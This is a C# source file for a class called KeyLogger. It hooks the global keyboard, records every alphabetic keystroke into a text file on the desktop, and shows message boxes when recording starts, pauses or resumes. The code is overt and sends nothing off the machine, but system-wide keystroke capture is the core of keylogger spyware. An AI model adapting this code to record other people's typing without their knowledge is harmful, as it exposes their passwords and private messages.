using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace MyTool

{
    class KeyLogger
    {
        bool state;

        StreamWriter writer;

        string desktopPath;

        KeyboardHook hook;

        public KeyLogger()
        {
            desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            desktopPath += "\\recording.txt";
            hook = new KeyboardHook();
            if (!File.Exists(desktopPath))
                File.Create(desktopPath);
            hook.KeyDown += new KeyEventHandler(addLetter);
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                hook.sensedKeys.Add(key);
            state = false;
        }
        public void start()
        {
            
            MessageBox.Show("a new recording started");
            if(!state)
                hook.hook();
            File.WriteAllText(desktopPath, String.Empty);
            state = true;

        }
        public void pause()
        {
            MessageBox.Show("recording paused");
            hook.unhook();
            state = false;
        }

        public void resume()
        {
            MessageBox.Show("a new recording resumed");
            hook.hook();
            state = true;
        }
        public void addLetter(object sender, KeyEventArgs e)
        {
            if (state)
            {
                char c = (char)(e.KeyValue);
           
                bool isAlphaBet = Regex.IsMatch(c.ToString(), "[a-z]", RegexOptions.IgnoreCase);

                if (isAlphaBet)
                    File.AppendAllText(desktopPath, ((char)e.KeyValue).ToString());
            }
        }
    }
}
